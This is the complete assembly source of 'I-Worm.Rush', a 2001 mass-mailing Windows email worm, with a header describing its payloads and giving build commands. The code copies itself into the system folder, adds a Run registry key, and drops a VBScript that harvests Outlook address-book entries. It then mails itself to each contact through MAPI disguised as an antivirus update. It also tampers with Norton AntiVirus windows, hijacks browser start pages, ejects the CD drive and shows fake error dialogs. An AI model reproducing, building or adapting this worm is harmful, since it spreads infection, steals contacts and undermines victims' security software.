comment #
Name : I-Worm.Rush
Author : PetiK
Date : August 27th - September 2nd
Size : 5632 byte (compiled with UPX tool)

Action : Copy itself to
		* WINDOWS\SYSTEM\Mail32.exe
	 Add in the key HKLM\Software\Microsoft\Windows\CurrentVersion\Run the value
		* Mail Outlook = WINDOWS\SYSTEM\Mail32.exe

	 * On Wednesday it opens the cdrom
	 * The 3rd it produces a sound
	 * the 15th it alters "Search Page", "Start Page", and "Local Page" by 
	 * Creates %personal%\Read_Me.txt with a text
	 * A vbs file search all email in the Oultook software and put them in the Mailbook.txt.
	   The worm scans the file to find email.

		Subject	: New Scan Virus...
		Body 	: Hi man,
			  I send you the last update of ScanVir (v 2.5).
			  Look at the file attached.

			  		Bye and have a nice day.

		Attached : ScanVir_25.exe

	 * Scans title of windows :
		- Norton AntiVirus => Norton Virus : W32.Norton.Worm@mm
		- System Properties => Minimize the window


To build the worm:
@echo off
tasm32 /ml /m9 Rush
tlink32 -Tpe -c -x -aa Rush,,,import32,dllz
upx -9 Rush.exe
if exist *.obj del *.obj
if exist *.map del *.map

To delete the worm:
del %windir%\system\Mail32.exe
del %personal%\Read_Me.txt
del %windir%\MailBook.txt

#

.586p
.model flat
.code

JUMPS

callx macro a
extrn a:proc
call a
endm

include useful.inc
include myinclude.inc

start:
	;call hide_worm

twin_worm:
	push  50
	mov   esi,offset orig_worm
	push  esi
	push  0
	callx GetModuleFileNameA

	mov   edi,offset copy_worm
	push  edi
	push  50
	push  edi
	callx GetSystemDirectoryA
	add   edi,eax
	mov   eax,"iaM\"
	stosd
	mov   eax,".23l"
	stosd
	mov   eax,"exe"
	stosd
	pop   edi

	push  0
	push  edi
	push  esi
	callx CopyFileA
	
	push  8
	push  edi
	push  1
	@pushsz "Mail Outlook"
	@pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
	push  80000002h
	callx SHSetValueA

check_date:
	push  offset SystemTime
	callx GetSystemTime
	cmp   [SystemTime.wDayOfWeek],03h
	jne   beep1
cdrom_open:
	push  00h
	push  00h
	push  00h
	@pushsz "open cdaudio"
	callx mciSendStringA
	push  00h
	push  00h
	push  00h
	@pushsz "set cdaudio door open"
	callx mciSendStringA
	
beep1:	push  offset SystemTime
	callx GetSystemTime
	cmp   [SystemTime.wDay],03h
	jne   special_folder
	mov   counter,0
beep2:	inc   counter
	push  30h
	callx MessageBeep
	push  1
	callx Sleep
	cmp   counter,5000
	jne   beep2

special_folder:
	push  00h
	push  05h
	push  offset personal
	push  00h
	callx SHGetSpecialFolderPathA
	@pushsz "\Read_Me.txt"
	push  offset personal
	callx lstrcat

txt_file:
	push  00h
	push  01h
	push  02h
	push  00h
	push  01h
	push  40000000h
	push  offset personal
	callx CreateFileA
	mov   [FileHdl],eax
	push  00h
	push  offset octets
	push  TXTSIZE
	push  offset txtd
	push  [FileHdl]
	callx WriteFile
	push  [FileHdl]
	callx CloseHandle

vbs_file:
	pushad
	push  00h
	push  80h
	push  02h
	push  00h
	push  01h
	push  40000000h
	@pushsz "C:\rushhour.vbs"
	callx CreateFileA
	xchg  edi,eax
	push  00h
	push  offset octets
	push  VBSSIZE
	push  offset vbsd
	push  edi
	callx WriteFile
	push  edi
	callx CloseHandle
	popad
	push  1
	@pushsz "wscript C:\rushhour.vbs"
	callx WinExec
	push  2000
	callx Sleep
	@pushsz "C:\rushhour.vbs"
	callx DeleteFileA

	push  offset SystemTime
	callx GetSystemTime
	cmp   [SystemTime.wDay],0Fh
	jne   start_scan

	call  internet_page

start_scan:
	mov   edi,offset mailbook
	push  edi
	push  50
	push  edi
	callx GetWindowsDirectoryA	
	add   edi,eax
	mov   eax,"iaM\"
	stosd
	mov   eax,"ooBl"
	stosd
	mov   eax,"xt.k"
	stosd
	mov   ax,"t"
	stosd	
	xor   eax,eax
	stosd

open_scan_file:
	pushad
	push  00h
	push  80h
	push  03h
	push  00h
	push  01h
	push  80000000h
	push  offset mailbook
	callx CreateFileA
	inc   eax
	je    not_exist
	dec   eax
	xchg  eax,ebx

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  2
	push  eax
	push  ebx
	callx CreateFileMappingA
	test  eax,eax
	je    F1
	xchg  eax,ebp

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  4
	push  ebp
	callx MapViewOfFile
	test  eax,eax
	je    F2
	xchg  eax,esi

	push  0
	push  ebx
	callx GetFileSize
	cmp   eax,3
	jbe   F3

scan_file:
	xor   edx,edx
	mov   edi,offset mail_addr
	push  edi
	p_c:  lodsb
	cmp   al," "
	je    car_s
	cmp   al,0dh
	je    entr1
	cmp   al,0ah
	je    entr2
	cmp   al,"#"
	je    f_mail
	cmp   al,"@"
	jne   not_a
	inc   edx
	not_a:	stosb
		jmp p_c
	car_s:	inc esi
		jmp p_c
	entr1:	xor al,al
		stosb
		pop edi
		test edx,edx
		je  scan_file
		call send_mail
		jmp scan_file
	entr2:	xor al,al
		stosb
		pop edi
		jmp scan_file
	f_mail:

	F3:	push  esi	
	callx UnmapViewOfFile
	F2:	push  ebp
	callx CloseHandle
	F1:	push  ebx
	callx CloseHandle
	not_exist:
	popad

scan_window:mov  counter,0
win1:	inc   counter
	cmp   counter,1000000
	je    end_w
	@pushsz "Norton AntiVirus"
	push  00h
	callx FindWindowA
	test  eax,eax
	jz    win2
	jmp   change_nav
win2:	@pushsz "System Properties"
	push  00h
	callx FindWindowA
	test  eax,eax
	jz    win3
	jmp   show_window
win3:	@pushsz "Microsoft Home Page - Microsoft Internet Explorer"
	push  00h
	callx FindWindowA
	test  eax,eax
	jz    win1
	jmp   display_message
change_nav:
	mov   edi,eax
	@pushsz "Norton Virus : W32.Norton.Worm@mm"
	push  edi
	callx SetWindowTextA
	jmp   win1
show_window:
	mov   edi,eax	
	push  2
	push  edi
	callx ShowWindow
	jmp   win1
display_message:
	mov   edi,eax
	push  10h
	@pushsz "Microsoft Internet Explorer"
	@pushsz "You don't have access to this page"
	push  00h
	callx MessageBoxA
	push  0
	push  edi
	callx ShowWindow
	jmp   win1

end_w:	push  00h
	callx ExitProcess

hide_worm:
	pushad
	@pushsz "Kernel32.dll"
	callx GetModuleHandleA
	xchg  eax,ecx
	jecxz end_hide_worm
	@pushsz "RegisterServiceProcess"
	push  ecx
	callx GetProcAddress
	xchg  eax,ecx
	jecxz end_hide_worm
	push  1
	push  0
	call  ecx
	end_hide_worm:
	popad
	ret

internet_page:
	pushad
	call  diff_val
	db    "Search Page",0
	db    "Start Page",0
	db    "Local Page",0
	diff_val:
	pop   esi
	push  3
	pop   ecx
	page_loop:
	push  ecx
	push  32
	@pushsz "http://www.petik.fr.fm"
	push  1
	push  esi
	@pushsz "Software\Microsoft\Internet Explorer\Main"
	push  80000001h
	callx SHSetValueA
	@endsz
	pop   ecx
	loop  page_loop
	popad
	ret

send_mail:
	xor   eax,eax
	push  eax
	push  eax
	push  offset Message
	push  eax
	push  [MAPIHdl]
	callx MAPISendMail
	ret
	


.data
; === copy_worm ===
orig_worm	db 50 dup (0)
copy_worm	db 50 dup (0)

; === beep ===
counter		dd ?

; === special_folder ===
personal	db 70 dup (0)
octets		dd ?
FileHdl		dd ?

; === scan email ===
mailbook	db 50 dup (0)
mail_addr	db 128 dup (?)
MAPIHdl		dd 0
name_mail	db "ScanVir_25.exe",0




subject		db "New Scan Virus...",0
body		db "Hi man,",0dh,0ah
		db "I send you the last update of ScanVir (v 2.5).",0dh,0ah
		db "Look at the file attached.",0dh,0ah,0dh,0ah
		db 09h,09h,09h,09h,"Bye and have a nice day.",0
namefrom	db "Your Best Friend",0

Message		dd ?
		dd offset subject
		dd offset body
		dd ?
		dd ?
		dd ?
		dd 2
		dd offset MsgFrom
		dd 1
		dd offset MsgTo
		dd 1
		dd offset Attach

MsgFrom		dd ?
		dd namefrom
		dd ?
		dd ?
		dd ?

MsgTo		dd ?
		dd 1
		dd offset mail_addr
		dd offset mail_addr
		dd ?
		dd ?

Attach		dd ?
		dd ?
		dd ?
		dd offset orig_worm
		dd offset name_mail
		dd ?
		

		

txtd:	db "Hi man,",0dh,0ah,0dh,0ah
	db "I don't want to destroy your computer.",0dh,0ah
	db "But other programs are more dangerous.",0dh,0ah,0dh,0ah,0dh,0ah
	db 09h,09h,09h,"PetiK",00h
TXTSIZE	equ $-txtd

vbsd:	db 'On Error Resume Next',0dh,0ah
	db 'Set rush=CreateObject("Outlook.Application")',0dh,0ah
	db 'Set chan=rush.GetNameSpace("MAPI")',0dh,0ah
	db 'Set fso=CreateObject("Scripting.FileSystemObject")',0dh,0ah
	db 'Set txt=fso.CreateTextFile(fso.GetSpecialFolder(0)&"\MailBook.txt")',0dh,0ah
	db 'txt.Close',0dh,0ah
	db 'For Each M In chan.AddressLists',0dh,0ah
	db 'If M.AddressEntries.Count <> 0 Then',0dh,0ah
	db 'For O=1 To M.AddressEntries.Count',0dh,0ah
	db 'Set P=M.AddressEntries(O)',0dh,0ah
	db 'Set txt=fso.OpenTextFile(fso.GetSpecialFolder(0)&"\MailBook.txt",8,true)',0dh,0ah
	db 'txt.WriteLine P.Address',0dh,0ah
	db 'txt.Close',0dh,0ah
	db 'Next',0dh,0ah
	db 'End If',0dh,0ah
	db 'Next',0dh,0ah
	db 'Set txt=fso.OpenTextFile(fso.GetSpecialFolder(0)&"\MailBook.txt",8,true)',0dh,0ah
	db 'txt.WriteLine "#"',0dh,0ah
	db 'txt.Close',0dh,0ah
VBSSIZE	equ $-vbsd

signature	db "I-Worm.Rush",00h
origine		db "A worm made in France",00h
author		db "Written by PetiK - 2001",00h

end start
end